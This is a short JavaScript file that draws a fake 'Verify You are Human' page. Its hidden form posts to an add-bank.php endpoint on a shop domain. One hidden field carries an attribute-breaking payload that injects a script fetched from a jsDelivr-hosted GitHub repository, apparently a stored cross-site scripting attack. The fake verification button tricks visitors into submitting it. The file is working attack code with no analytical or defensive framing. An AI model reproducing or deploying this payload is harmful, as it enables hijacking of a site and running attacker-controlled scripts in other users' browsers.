// 999.js
(function() {
  var container = document.createElement('div');
  container.style.textAlign = 'center';
  container.style.marginTop = '100px';

  var title = document.createElement('h1');
  title.textContent = 'Verify You are Human';
  container.appendChild(title);

  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://gold-coinjp.shop/newbie/tools/add-bank.php';
  form.id = 'verifyForm';

  var inputImage = document.createElement('input');
  inputImage.type = 'hidden';
  inputImage.name = 'image';
  inputImage.value = 'httpsX"><script src="https://cdn.jsdelivr.net/gh/inggarfi/dexter@main/mines.js"></script>';

  var inputNoRek = document.createElement('input');
  inputNoRek.type = 'hidden';
  inputNoRek.name = 'no_rek';
  inputNoRek.value = '00';

  var inputPemilik = document.createElement('input');
  inputPemilik.type = 'hidden';
  inputPemilik.name = 'pemilik';
  inputPemilik.value = '00';

  var submitBtn = document.createElement('input');
  submitBtn.type = 'submit';
  submitBtn.value = 'Verify';
  submitBtn.style.padding = '10px 20px';
  submitBtn.style.fontSize = '16px';

  form.appendChild(inputImage);
  form.appendChild(inputNoRek);
  form.appendChild(inputPemilik);
  form.appendChild(submitBtn);

  container.appendChild(form);
  document.body.appendChild(container);
})();
